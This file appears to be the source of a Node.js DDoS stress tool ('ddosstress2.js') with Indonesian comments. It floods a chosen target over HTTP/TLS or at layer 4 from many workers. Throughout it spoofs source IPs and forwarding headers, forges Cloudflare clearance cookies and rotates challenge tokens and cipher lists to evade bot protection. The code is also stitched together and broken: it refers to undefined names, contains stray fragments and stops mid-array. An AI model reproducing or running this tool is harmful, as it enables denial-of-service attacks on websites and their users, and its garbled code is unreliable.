import cluster from "node:cluster";
import chalk from "chalk";
import { URL } from "url";
import { createRequire } from "module";
import net from "net";
import http from "http";
import https from "https";
import fs from "fs";
import figlet from "figlet";
import gradient from "gradient-string";
import tls from "tls";
import crypto from "crypto";
import querystring from "querystring";
import { parentPort, workerData } from "worker_threads";
import {} from "worker_threads";
import os from "os";
process.setMaxListeners(0);
import events from "events";
events.EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (err) {
});
const require = createRequire(import.meta.url);
let raw;
try { raw = require("raw-socket"); } catch {}

const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
                     .split("\n")
                     .filter(line => line.trim().length > 0);

if (process.argv.length < 7) {
  console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
  process.exit(1);
}

const targetStr   = process.argv[2];
const concurrency = parseInt(process.argv[3], 10) || 5;
const durationSec = parseInt(process.argv[4], 10) || 60;
const duration    = durationSec * 1000;
const layerFlag   = process.argv[6].toLowerCase() || "layer7";
const PACKET_SIZE = 432492;
// Fungsi untuk membuat IP acak (0–255 di setiap oktet)
const ipSpoof = () => {
  return (
    Math.floor(Math.random() * 256) + '.' +
    Math.floor(Math.random() * 256) + '.' +
    Math.floor(Math.random() * 256) + '.' +
    Math.floor(Math.random() * 256)
  );
};

// Contoh IP spoof langsung sekali generate
const spoofed = ipSpoof();

// Ambil argument dari command line
const args = {
  target: process.argv[2],      // alamat target
  time: Number(process.argv[3]), // durasi serangan
  rate: Number(process.argv[4]), // rate request
  threads: Number(process.argv[5]), // jumlah thread
  proxyFile: process.argv[6]    // file proxy list
};

let urlObj, hostname, port, protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 10) : (protocol === "https:" ? 443 : 80);
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 80;
    urlObj = new URL(`${protocol}//${hostname}:${port}`);
  }
} catch {
  console.log(chalk.red("Invalid target"));
  process.exit(1);
}

async function checkPort(host, port) {
  return new Promise(resolve => {
    const socket = net.createConnection({ host, port, timeout: 2000 }, () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });
}
function printBanner() {
  try {
    console.log(gradient.pastel.multiline(
      figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
    ));
  } catch {
  console.log(chalk.green.bold("=================================================="));
  
    console.log(chalk.bold("                                         "));
  }

  console.log(chalk.gray(`                              v3.3\n`));
  console.log(chalk.red("-> ") + chalk.yellow("Target     ") + "📌 " + chalk.green(urlObj.href));
  console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
  console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
  console.log("[31m-> [0mGithub[33m 🗂 : [32mhttps://github.com/chainner190");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag)); console.log(chalk.green.bold("=================================================="));
}

// --- Master ---
if (cluster.isPrimary) {
  (async () => {
    const isOpen = await checkPort(hostname, port);

    printBanner();
    console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));

    for (let id = 1; id <= concurrency; id++) {
      await new Promise(resolve => {
        const worker = cluster.fork({
          WORKER_ID: id,
          URL: urlObj.href,
          LAYER: layerFlag,
          DURATION: duration
        });
        worker.once("online", () => resolve());
      });
    }

    setTimeout(() => {
      console.log(chalk.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, duration);

    cluster.on("exit", (worker) => {
      const wid = worker?.process?.env?.WORKER_ID || worker.id;
      console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${wid} exited`));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 10);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);
const now = new Date().toLocaleTimeString("id-ID", { 
  timeZone: "Asia/Jakarta",
  hour12: false,
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

console.log(chalk.green(`[ DDOSSTRESS ] [${now}] -> Engine ${wid} Started`));


if (layer === "layer4") {
    mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
  } else {
    mainWorkerLayer7(wid, targetUrl);
  }
}
export function randomBoolean() {
  return Math.random() < 0.5;
}

export function randomString(length) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

export function randomInteger(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export function randomItem(array) {
  return array[Math.floor(Math.random() * array.length)];
}
const HTTP_ACCEPT_HEADERS = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
];

const HTTP_LANGUAGE_HEADERS = [
  "en-US,en;q=0.5",
  "es-ES,en;q=0.5",
  "fr-FR,en;q=0.5",
  "de-DE,en;q=0.5",
  "it-IT,en;q=0.5",
  "pt-BR,en;q=0.5",
];

const HTTP_ENCODING_HEADERS = [
  "gzip, deflate, br",
  "gzip, deflate",
  "gzip",
  "deflate, br",
  "deflate",
  "br",
];
const WORKERS = os.cpus().length;

if (isMainThread) {
  let totalRequests = 0;

  // hitung tiap 1 detik
  setInterval(() => {
    console.log(`[MONITOR] Rate: ${totalRequests} req/s`);
    if (totalRequests < TARGET_RATE) {
      console.log(`[ADAPT] ⚡ Rate (${totalRequests}) di bawah target ${TARGET_RATE}`);
      // 👉 di sini bisa tambah worker atau tingkatkan concurrency
    }
    totalRequests = 0;
  }, 1000);

  // spawn worker sesuai jumlah core CPU
  for (let i = 0; i < WORKERS; i++) {
    const w = new Worker(new URL(import.meta.url), { workerData: { targetUrl } });
    w.on("message", () => totalRequests++);
  }
} else {
  const lib = workerData.targetUrl.startsWith("https") ? https : http;

  function send() {
    const req = lib.get(workerData.targetUrl, () => {
      parentPort.postMessage(1);
      setImmediate(send);
    });

    req.on("error", () => {
      parentPort.postMessage(0);
      setImmediate(send);
    });
  }

  send();
}
const startAttack = () => {
  const { target, proxies, userAgents, duration } = workerData;
  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;

  let totalPackets = 0;
  const pool = new Set();

  const createBot = (proxy) => {
    const bot = new HTTPBot({
      proxy,
      userAgent: randomItem(userAgents),
      followRedirects: true,
      headers: {
        Accept: randomItem(HTTP_ACCEPT_HEADERS),
        "Accept-Language": randomItem(HTTP_LANGUAGE_HEADERS),
        "Accept-Encoding": randomItem(HTTP_ENCODING_HEADERS),
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      responseCallback: (error) => {
        if (error) {
          parentPort.postMessage({
            log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${error.message}`,
            totalPackets,
          });
        } else {
          totalPackets++;
          parentPort.postMessage({
            log: `✅ Request successful from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
            totalPackets,
          });
        }
      },
    });

    pool.add(bot);
    bot.startCycle(fixedTarget);
  };

  const createPool = () => {
    proxies.forEach((proxy) => createBot(proxy));
  };

  const clearPool = () => {
    pool.forEach((bot) => bot.stopCycle());
    pool.clear();
  };

  setTimeout(() => {
    clearPool();
    parentPort.postMessage({ log: "Attack finished", totalPackets });
    process.exit(0);
  }, duration * 1000);

  createPool();
};

if (workerData) {
  startAttack();
}
const firstElement = dataList[0];
const lookupKey = prefix + firstElement;
const lookupValue = dictionary[lookupKey];
if (!lookupValue) {
  const StateWrapper = function (input) {
    this.input = input;
    this.flags = [1, 0, 0];
    this.getState = function () {
      return 'newState';
    };
    this.pattern1 = "\\w+ *\\(\\) *{\\w+ *";
    this.pattern2 = "['|\"]+. +['|\"];? *}";
  };
}

// --- Error Collector ---
const errorStats = {};
function collectError(ip, msg) {
  const key = `${ip}|${msg}`;
  errorStats[key] = (errorStats[key] || 0) + 1;
}
setInterval(() => {
  const keys = Object.keys(errorStats).sort();
  for (const key of keys) {
    const [ip, msg] = key.split("|");
function getTime() {
  return new Date().toLocaleTimeString("id-ID", { 
    timeZone: "Asia/Jakarta",
    hour12: false,
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
}

// contoh pemakaian
console.log(chalk.red(`[ DDOSSTRESS ] [${getTime()}] -> (${ip}) An error has occured: ${msg} [x${errorStats[key]}]`));
  }
  for (const k in errorStats) delete errorStats[k];
}, 30000);

export function sendTlsRequest(parsedTarget, siga = "", cipper = "") {
  return new Promise((resolve) => {
    try {
      // Buat socket
      const socket = new tls.TLSSocket(null, {
        rejectUnauthorized: false,
        servername: parsedTarget.host,
        secureProtocol: "TLS_method",
        ecdhCurve: "prime256v1:X25519",
        ciphers: tls.getCiphers().join(":") + cipper,
        ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1', 'http/1.2', 'http/2'],
        honorCipherOrder: true,
        secureOptions:
          crypto.constants.SSL_OP_NO_RENEGOTIATION |
          crypto.constants.SSL_OP_NO_TICKET |
          crypto.constants.SSL_OP_NO_SSLv2 |
          crypto.constants.SSL_OP_NO_SSLv3 |
          crypto.constants.SSL_OP_NO_COMPRESSION |
          crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
          crypto.constants.SSL_OP_TLSEXT_PADDING |
          crypto.constants.SSL_OP_ALL |
          crypto.constants.SSL_OP_NO_TLSv1 |
          crypto.constants.SSL_OP_NO_TLSv1_1 |
          crypto.constants.ALPN_ENABLED |
          crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
          crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
          crypto.constants.SSL_OP_COOKIE_EXCHANGE |
          crypto.constants.SSL_OP_PKCS1_CHECK_1 |
          crypto.constants.SSL_OP_PKCS1_CHECK_2 |
          crypto.constants.SSL_OP_SINGLE_DH_USE |
          crypto.constants.SSL_OP_SINGLE_ECDH_USE |
          crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      });

      socket.setKeepAlive(true, 600000); // keep-alive 10 menit

      const options = {
        host: parsedTarget.host,
        port: parsedTarget.port || 443,
        method: "GET",
        path: parsedTarget.pathname || "/",
        socket,
        headers: {
          "User-Agent": "Mozilla/5.0",
        },
      };

      const req = https.request(options, (res) => {
        let body = "";
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => resolve({ status: "success", body }));
      });

      req.on("error", (err) => resolve({ status: "error", error: err.message }));

      req.end();
    } catch (err) {
      resolve({ status: "error", error: err.message });
    }
  });
}
function generateHeaders(parsedTarget, options = {}) {
  const { userAgent = "Mozilla/5.0", spoofedIP = "127.0.0.1", randomPath = "/" } = options;

  return {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":path": parsedTarget.pathname + randomPath,
    ":scheme": "https",
    "x-forwarded-proto": "https",
    "cache-control": "no-cache",
    "X-Forwarded-For": spoofedIP,
    "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "upgrade-insecure-requests": "1",
    "Connection": "keep-alive",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "document",
    "sec-fetch-user": "?1",
    "cookie": `cf_clearance=${crypto.randomBytes(16).toString("hex")}`,
    "sec-fetch-site": "none",
    "x-requested-with": "XMLHttpRequest",
    "X-Cache": "HIT",
    "server-timing": "pop;desc=KUL;dur=4,cache;desc=EDGE,hotness;desc=1,proto;desc=h3",
    "Cache-Control": "public,browser-ttl=0,sw-max-age=31536000,max-age=31529065",
    "Via": spoofedIP,
    "Sec-Websocket-Key": spoofedIP,
    "Sec-Websocket-Version": "13",
    "Upgrade": "websocket",
    "X-Forwarded-Host": spoofedIP,
    "Client-IP": spoofedIP,
    "Real-IP": spoofedIP,
    "Referer": "https://" + parsedTarget.host,
    "Referrer-Policy": "no-referrer",
    "Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable",
    "x-frame-options": "SAMEORIGIN",
    "x-xss-protection": "1; mode=block",
    "user-agent": userAgent
  };
}
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", 'ecdsa_secp521r1_sha512', "rsa_pss_rsae_sha256", 'rsa_pss_rsae_sha384', "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const pathts = ["?s=", '/?', '', "?q=", '?true=', '?', '/', "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", "?page=2", '?page=3', '?category=news', "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04", '?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514', '?__cf_chl_tk=ZpDDzirt54EoyEeNjwwGO_FZktYyR0QxXRz9Vt_egvk-1711220025-0.0.1.1-1471', "?__cf_chl_tk=2QI_clISOivyUmvBJ4fkVroBhLME3TJv3_2coOv7BXc-1711307038-0.0.1.1-1471", '?__cf_chl_tk=z6L8htd0t62MvL0xSbWgI67gGERMr2u7zjFDIlkGWYQ-1711310297-0.0.1.1-1471', "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU", "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU", "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs", "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA", '?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU', '?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs', '?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A', "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA", "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs", "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA", "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U", "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU", "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs", "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA", "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A", "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs", '?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA', "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU", "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs", "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA", "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0", "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh", "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0", '?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0', '?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0', "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU", "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU", "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA", "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU", "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU", "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs", "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA", "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A", "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs", "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs"];
const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK'];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2,application/x-lzma', "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", 